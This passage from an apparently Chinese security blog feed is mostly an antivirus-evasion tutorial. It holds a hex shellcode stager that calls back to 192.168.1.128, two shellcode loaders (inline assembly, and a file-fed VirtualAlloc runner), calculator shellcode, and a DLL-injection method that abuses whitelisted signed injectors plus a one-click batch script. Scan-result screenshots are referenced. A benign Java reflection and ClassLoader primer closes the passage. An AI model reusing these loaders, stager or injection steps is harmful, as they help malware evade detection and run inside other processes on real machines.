8a\xf6\xe2\x80\x17\x25\x17\x49\x40\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x32\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x36\x2e\x30\x3b\x20\x4d\x44\x44\x43\x4a\x53\x29\x0d\x0a\x00\xd9\x15\xca\x8d\xd0\x59\x00\x30\xf1\xcf\xe4\x90\x68\x2b\xfd\x48\x06\xee\x2f\xc6\x62\x36\x0e\x54\x1a\x8a\xf9\x14\xd2\xf0\xd8\x3b\x18\x0c\xfd\xc2\x17\x1b\x6c\x17\xc0\xf2\xc1\xe0\x7f\xb3\xad\x1f\x5e\x36\x59\xdb\xd8\xec\xa8\x90\xab\x36\x5a\xbb\x16\x7b\x42\x59\x53\x42\x50\xd7\x1b\x71\xc9\x84\x2a\xbe\xe0\x82\x5c\xfc\x1a\x6c\xf3\x05\xba\x00\x9b\xd4\x06\xba\xac\x7d\xe7\x49\x67\x90\x7f\xc9\x9a\x08\xde\x36\x81\xa9\xe9\xcf\xf7\x5d\xf2\x45\x61\xef\xed\xc1\x9d\x52\xef\x4f\x4c\x85\x06\x02\xc2\x21\xe6\x6e\x68\x23\x78\x73\x06\xc5\x11\xc4\xac\x3c\x5d\x97\xa2\x5f\x4b\x63\xbb\x0d\xe2\xa6\x50\x18\x21\xb2\x96\x9a\x4c\xbb\xbd\x96\x95\x45\xf8\x25\xe5\xb8\x47\x44\xae\x23\xce\x6d\x79\xa3\x06\x60\x17\xd3\xe8\x0e\x01\xc0\xb5\x2c\x32\xb8\x88\xe2\xc0\x0b\x97\xec\x06\xb7\x4a\x67\x97\xcb\x44\x78\xa7\x01\x9e\xe2\xe4\x2b\x46\x8a\xef\x93\xea\x42\x7e\x28\xe6\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x31\x32\x38\x00\x49\x96\x02\xd2&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="加载shellcode"><a href="#加载shellcode" class="headerlink" title="加载shellcode"></a>加载shellcode</h3><h4 id="c语言内联汇编（支持32位）"><a href="#c语言内联汇编（支持32位）" class="headerlink" title="c语言内联汇编（支持32位）"></a>c语言内联汇编（支持32位）</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>) <span class="comment">//将data段的内存设置成可读可写可执行</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* shellcode代码段 */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	__asm &#123;</span><br><span class="line">		lea eax,buf		<span class="comment">//加载buf的地址到eax寄存器</span></span><br><span class="line">		call eax		<span class="comment">//通过call函数来调用</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20231109152818466.png" alt="image-20231109152818466" style="zoom:80%;" />



<h2 id="免杀——c语言"><a href="#免杀——c语言" class="headerlink" title="免杀——c语言"></a>免杀——c语言</h2><h3 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h3><p>首先拿一个弹计算器的十六进制shellcode</p>
<p><strong>shellcode_hex.txt</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4881EC0001000065488B042560000000488B4018488B4030488B7010488B5840488B00817B0C3300320075EC488BCE48C7C23274910CE8C00000004C8BF048C7C36C6C00005348BB7573657233322E6453488BCC4883EC1841FFD6488BD8488BCB48C7C26A0A381EE88E0000004C8BF04D33C94D33C04833D24833C941FFD6488BCE48C7C2512FA201E86D0000004C8BF04833C05048B863616C632E65786550488BCC4883EC2048C7C20100000041FFD6488BCE48BA85DFAFBB00000000E8380000004C8BF048C7C0616400005048B8457869745468726550488BCE488BD44883EC2041FFD64C8BF04881C4880100004883EC184833C941FFD6C34883EC4056488BFA488BD9488B733C488BC648C1E03648C1E836488BB4038800000048C1E62048C1EE204803F3568B76204803F34833C9FFC9FFC1AD4803C333D2803800740FC1CA07510FBE0803D15948FFC0EBEC3BD775E05E8B56244803D30FBF0C4A8B561C4803D38B048A4803C35E4883C440C3</span><br></pre></td></tr></table></figure>

<p>写一个初步的加载器：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">char</span> <span class="title">hexCharToByte</span><span class="params">(<span class="type">char</span> character)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (character &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; character &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> character - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (character &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; character &lt;= <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> character - <span class="string">&#x27;a&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (character &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; character &lt;= <span class="string">&#x27;F&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> character - <span class="string">&#x27;A&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hexStringToBytes</span><span class="params">(<span class="type">const</span> std::string&amp; hexString, <span class="type">unsigned</span> <span class="type">char</span>* byteArray, <span class="type">int</span> byteArraySize)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; hexString.<span class="built_in">length</span>(); i += <span class="number">2</span>) &#123;</span><br><span class="line">        byteArray[i / <span class="number">2</span>] = <span class="built_in">hexCharToByte</span>(hexString[i]) * <span class="number">16</span> + <span class="built_in">hexCharToByte</span>(hexString[i + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    std::string filepath = argv[<span class="number">1</span>];</span><br><span class="line">	<span class="function">std::ifstream <span class="title">file</span><span class="params">(filepath)</span></span>;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    string contents;</span><br><span class="line">    <span class="keyword">if</span> (file.<span class="built_in">is_open</span>()) &#123;</span><br><span class="line">        std::stringstream buffer;</span><br><span class="line">        buffer &lt;&lt; file.<span class="built_in">rdbuf</span>();</span><br><span class="line">        contents = buffer.<span class="built_in">str</span>();</span><br><span class="line">        size = contents.<span class="built_in">length</span>()/<span class="number">2</span>;</span><br><span class="line">        file.<span class="built_in">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* buffer = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">hexStringToBytes</span>(contents, buffer, size);</span><br><span class="line">    <span class="type">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(exec, buffer, size);</span><br><span class="line">    ((<span class="built_in">void</span>(*) ())exec)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vs编译后加载shellcode</p>
<img src="/image/image-20231109173123369.png" alt="image-20231109173123369" style="zoom:50%;" />

<p><strong>virus total</strong></p>
<img src="/image/image-20231109173238057.png" alt="image-20231109173238057" style="zoom: 33%;" />

<p><strong>微步</strong></p>
<img src="/image/image-20231109173658924.png" alt="image-20231109173658924" style="zoom: 33%;" />

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h2><p>python官方提供了两个文件</p>
<p><code>inject_dll_amd64.exe</code>和<code>inject_dll_x86.exe</code></p>
<p>两个文件是DLL注入器，分别对应X86和X64位操作系统，在Windows目录下存在c++源码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;kernel32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;user32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Helper to free data when we leave the scope.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DataToFree</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    HANDLE hProcess;</span><br><span class="line">    HANDLE snapshotHandle;</span><br><span class="line">    </span><br><span class="line">    LPVOID remoteMemoryAddr;</span><br><span class="line">    <span class="type">int</span> remoteMemorySize;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">DataToFree</span>()&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;hProcess = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">this</span>-&gt;snapshotHandle = <span class="literal">nullptr</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">this</span>-&gt;remoteMemoryAddr = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">this</span>-&gt;remoteMemorySize = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ~<span class="built_in">DataToFree</span>() &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;hProcess != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;remoteMemoryAddr != <span class="literal">nullptr</span> &amp;&amp; <span class="keyword">this</span>-&gt;remoteMemorySize != <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">VirtualFreeEx</span>(<span class="keyword">this</span>-&gt;hProcess, <span class="keyword">this</span>-&gt;remoteMemoryAddr, <span class="keyword">this</span>-&gt;remoteMemorySize, MEM_RELEASE);</span><br><span class="line">                <span class="keyword">this</span>-&gt;remoteMemoryAddr = <span class="literal">nullptr</span>;</span><br><span class="line">                <span class="keyword">this</span>-&gt;remoteMemorySize = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">CloseHandle</span>(<span class="keyword">this</span>-&gt;hProcess);</span><br><span class="line">            <span class="keyword">this</span>-&gt;hProcess = <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;snapshotHandle != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="built_in">CloseHandle</span>(<span class="keyword">this</span>-&gt;snapshotHandle);</span><br><span class="line">            <span class="keyword">this</span>-&gt;snapshotHandle = <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * All we do here is load a dll in a remote program (in a remote thread).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Arguments must be the pid and the dll name to run.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * i.e.: inject_dll.exe &lt;pid&gt; &lt;dll path&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">wmain</span><span class="params">( <span class="type">int</span> argc, <span class="type">wchar_t</span> *argv[ ], <span class="type">wchar_t</span> *envp[ ] )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Running executable to inject dll.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Helper to clear resources.</span></span><br><span class="line">    DataToFree dataToFree;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">3</span>)&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Expected 2 arguments (pid, dll name).&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> pid = _wtoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Invalid pid.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> MAX_PATH_SIZE_PADDED = MAX_PATH + <span class="number">1</span>;</span><br><span class="line">    <span class="type">char</span> dllPath[MAX_PATH_SIZE_PADDED];</span><br><span class="line">    <span class="built_in">memset</span>(&amp;dllPath[<span class="number">0</span>], <span class="string">&#x27;\0&#x27;</span>, MAX_PATH_SIZE_PADDED);</span><br><span class="line">    <span class="type">size_t</span> pathLen = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">wcstombs_s</span>(&amp;pathLen, dllPath, argv[<span class="number">2</span>], MAX_PATH);</span><br><span class="line">    </span><br><span class="line">    <span class="type">const</span> <span class="type">bool</span> inheritable = <span class="literal">false</span>;</span><br><span class="line">    <span class="type">const</span> HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, inheritable, pid);</span><br><span class="line">    <span class="keyword">if</span>(hProcess == <span class="literal">nullptr</span> || hProcess == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Unable to open process with pid: &quot;</span> &lt;&lt; pid &lt;&lt; <span class="string">&quot;. Error code: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dataToFree.hProcess = hProcess;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;OpenProcess with pid: &quot;</span> &lt;&lt; pid &lt;&lt; std::endl;</span><br><span class="line">    </span><br><span class="line">    <span class="type">const</span> LPVOID remoteMemoryAddr = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">nullptr</span>, MAX_PATH_SIZE_PADDED, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span>(remoteMemoryAddr == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Error. Unable to allocate memory in pid: &quot;</span> &lt;&lt; pid &lt;&lt; <span class="string">&quot;. Error code: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dataToFree.remoteMemorySize = MAX_PATH_SIZE_PADDED;</span><br><span class="line">    dataToFree.remoteMemoryAddr = remoteMemoryAddr;</span><br><span class="line">    </span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;VirtualAllocEx in pid: &quot;</span> &lt;&lt; pid &lt;&lt; std::endl;</span><br><span class="line">    </span><br><span class="line">    <span class="type">const</span> <span class="type">bool</span> written = <span class="built_in">WriteProcessMemory</span>(hProcess, remoteMemoryAddr, dllPath, pathLen, <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="keyword">if</span>(!written)&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Error. Unable to write to memory in pid: &quot;</span> &lt;&lt; pid &lt;&lt; <span class="string">&quot;. Error code: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;WriteProcessMemory in pid: &quot;</span> &lt;&lt; pid &lt;&lt; std::endl;</span><br><span class="line">    </span><br><span class="line">    <span class="type">const</span> LPVOID loadLibraryAddress = (LPVOID) <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(loadLibraryAddress == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Error. Unable to get LoadLibraryA address. Error code: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;loadLibraryAddress: &quot;</span> &lt;&lt; pid &lt;&lt; std::endl;</span><br><span class="line">    </span><br><span class="line">    <span class="type">const</span> HANDLE remoteThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">nullptr</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE) loadLibraryAddress, remoteMemoryAddr, <span class="number">0</span>, <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="keyword">if</span> (remoteThread == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Error. Unable to CreateRemoteThread. Error code: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">7</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// We wait for the load to finish before proceeding to get the function to actually do the attach.</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Waiting for LoadLibraryA to complete.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    DWORD result = <span class="built_in">WaitForSingleObject</span>(remoteThread, <span class="number">5</span> * <span class="number">1000</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(result == WAIT_TIMEOUT) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;WaitForSingleObject(LoadLibraryA thread) timed out.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">8</span>;</span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(result == WAIT_FAILED) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;WaitForSingleObject(LoadLibraryA thread) failed. Error code: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">9</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Ok, finished dll injection.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20231109100908704.png" alt="image-20231109100908704" style="zoom: 67%;" />

<p>可以看到这两个文件签名都在白名单中</p>
<p>使用方法：</p>
<ul>
<li><p>pid : 目标进程的进程ID</p>
</li>
<li><p>dll name: 想要注入目标进程的DLL绝对路径</p>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&gt;inject_dll_amd64.exe</span><br><span class="line">Running executable to inject dll.</span><br><span class="line">Expected 2 arguments (pid, dll name).</span><br></pre></td></tr></table></figure>



<p>使用批处理一键注入：</p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">set</span> target_process_name=要注入的进程.exe</span><br><span class="line"><span class="built_in">set</span> dll_name=calc_x64.dll</span><br><span class="line"><span class="built_in">set</span> injecter=inject_dll_amd64.exe</span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=<span class="number">2</span>&quot; <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;tasklist ^| <span class="built_in">findstr</span> /i &quot;<span class="variable">%target_process_name%</span>&quot;&#x27;) <span class="keyword">do</span> <span class="built_in">set</span> &quot;pid=<span class="variable">%%i</span>&quot;</span><br><span class="line"><span class="built_in">set</span> &quot;command=<span class="variable">%CD%</span>\<span class="variable">%injecter%</span> <span class="variable">%pid%</span> <span class="variable">%CD%</span>\<span class="variable">%dll_name%</span>&quot;</span><br><span class="line"><span class="variable">%command%</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全基础</title>
    <url>/2023/10/23/Java%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h1 id="Java安全基础"><a href="#Java安全基础" class="headerlink" title="Java安全基础"></a>Java安全基础</h1><h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><h3 id="类和对象的关系"><a href="#类和对象的关系" class="headerlink" title="类和对象的关系"></a>类和对象的关系</h3><p>类是对象的抽象，而对象是类的具体实例。类是抽象的，不占用内存，而对象是具体的，占用存储空间。类是用于创建对象的蓝图，它是一个定义包括在特定类型的对象中的方法和变量的软件模板。</p>
<p>类与对象的关系就如模具和铸件的关系 类的实例化结果就是对象，而对一类对象的抽象就是类，类描述了一组有相同属性和相同方法的对象。</p>
<h3 id="class类的newInstance方法"><a href="#class类的newInstance方法" class="headerlink" title="class类的newInstance方法"></a>class类的newInstance方法</h3><p>class的newInstance()方法,需要我们类中存在无参的构造器，并且能直接访问，它通过无参的构造器来实例化，而一旦我们类中不存在无参构造器，那么第一种方法就不行了</p>
<h3 id="getMethods-和-getDeclaredMethods-方法的区别"><a href="#getMethods-和-getDeclaredMethods-方法的区别" class="headerlink" title="getMethods 和 getDeclaredMethods 方法的区别"></a>getMethods 和 getDeclaredMethods 方法的区别</h3><p>getMethods：获取当前类或父类或父接口的 <strong>public</strong> 修饰的字段；包含接口中 <strong>default</strong> 修饰的方法 (JDK1.8)。</p>
<p>getDeclaredMethods： 获取<strong>当前类的所有方法</strong>；包括 protected&#x2F;默认&#x2F;private 修饰的方法；不包括父类 、接口 public 修饰的方法。</p>
<h3 id="反射Runtime-exec和ProcessBuilder区别"><a href="#反射Runtime-exec和ProcessBuilder区别" class="headerlink" title="反射Runtime.exec和ProcessBuilder区别"></a>反射Runtime.exec和ProcessBuilder区别</h3><p>Rutime无需构造器newInstance实例化，因为getRuntime方法本身会返回一个Runtime对象；而ProcessBuilder需要先反射获取有参构造器，再通过构造器进行实例化</p>
<blockquote>
<p>RunTime是JVM负责实例化的,且使用了单例设计模式,必须通过RunTime内部的getRuntime()方法获取实例化对象</p>
</blockquote>
<h3 id="Java接口"><a href="#Java接口" class="headerlink" title="Java接口"></a>Java接口</h3><p>接口（英文：Interface），在JAVA编程语言中是一个抽象类型，是抽象方法的集合，接口通常以interface来声明。一个类通过继承接口的方式，从而来继承接口的抽象方法。</p>
<p>接口并不是类，编写接口的方式和类很相似，但是它们属于不同的概念。类描述对象的属性和方法。接口则包含类要实现的方法。</p>
<p>除非实现接口的类是抽象类，否则该类要定义接口中的所有方法。</p>
<p>接口无法被实例化，但是可以被实现。一个实现接口的类，必须实现接口内所描述的所有方法，否则就必须声明为抽象类。另外，在 Java 中，接口类型可用来声明一个变量，他们可以成为一个空指针，或是被绑定在一个以此接口实现的对象。</p>
<h3 id="transient关键字"><a href="#transient关键字" class="headerlink" title="transient关键字"></a>transient关键字</h3><p>transient是短暂的意思。对于transient 修饰的成员变量，在类的实例对象的序列化处理过程中会被忽略。 因此，transient变量不会贯穿对象的序列化和反序列化，生命周期仅存于调用者的内存中而不会写到磁盘里进行持久化。</p>
<p>transient是Java语言的关键字，用来表示一个成员变量不是该对象序列化的一部分。当一个对象被序列化的时候，transient型变量的值不包括在序列化的结果中。而非transient型的变量是被包括进去的。 注意static修饰的静态变量天然就是不可序列化的。</p>
<h2 id="ClassLoader（类加载机制）"><a href="#ClassLoader（类加载机制）" class="headerlink" title="ClassLoader（类加载机制）"></a>ClassLoader（类加载机制）</h2><p>Java是一个依赖于<code>JVM</code>（Java虚拟机）实现的跨平台的开发语言。Java程序在运行前需要先编译成<code>class文件</code>，Java类初始化的时候会调用<code>java.lang.ClassLoader</code>加载类字节码，<code>ClassLoader</code>会调用JVM的native方法（<code>defineClass0/1/2</code>）来定义一个<code>java.lang.Class</code>实例。</p>
<p><strong>JVM架构图：</strong></p>
<img src="/image/JvmSpec7.png" alt="img" style="zoom: 80%;" />

<h3 id="Java类"><a href="#Java类" class="headerlink" title="Java类"></a>Java类</h3><p>Java是编译型语言，我们编写的java文件需要编译成后class文件后才能够被JVM运行</p>
<p><strong>示例代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可通过<code>javap</code>反汇编class文件，或者通过hexdump查看二进制数据</p>
<img src="/image/image-20230702161600126.png" alt="image-20230702161600126" style="zoom: 67%;" />

<p>JVM在执行<code>TestHelloWorld</code>之前会先解析class二进制内容，JVM执行的其实就是如上<code>javap</code>命令生成的字节码。</p>
<h3 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h3><p>​	一切的Java类都必须经过JVM加载后才能运行，而<code>ClassLoader</code>的主要作用就是Java类文件的加载。</p>
<p>在JVM类加载器中最顶层的是<code>Bootstrap ClassLoader（引导类加载器）</code>、<code>Extension ClassLoader（扩展类加载器）</code>、<code>App ClassLoader（系统类加载器）</code>，<code>AppClassLoader</code>是默认的类加载器</p>
<p>如果类加载时我们不指定类加载器的情况下，默认会使用<code>AppClassLoader</code>加载类，<code>ClassLoader.getSystemClassLoader()</code>返回的系统类加载器也是<code>AppClassLoader</code>。</p>
<img src="/image/image-20230702162142998.png" alt="image-20230702162142998" style="zoom:80%;" />

